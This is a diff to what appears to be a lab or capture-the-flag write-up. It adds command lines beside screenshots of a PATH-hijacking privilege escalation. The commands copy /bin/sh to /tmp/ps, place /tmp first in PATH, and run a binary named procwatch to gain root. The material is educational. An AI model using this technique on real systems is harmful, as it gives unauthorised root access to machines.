@@ -125,6 +125,8 @@ let's find out what is this procwatch file
 
 ![](https://i.imgur.com/qeq0dNI.png)
 
+`file procwatch`
+
 okay that means we are on the right path , let's run the executable file
 
 ![](https://i.imgur.com/uup29RS.png)
@@ -141,9 +143,14 @@ let's do it and get a copy of sh command
 
 ![](https://i.imgur.com/tVkWfqT.png)
 
+`cp /bin/sh /tmp/ps`
+
 printing out PATH variable so we can know what to modify and then modifying it
 
 ![](https://i.imgur.com/q5YeqBi.png)
+
+`echo $PATH`
+`export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games`
 
 so here we ran procwatch and we're root now!
 
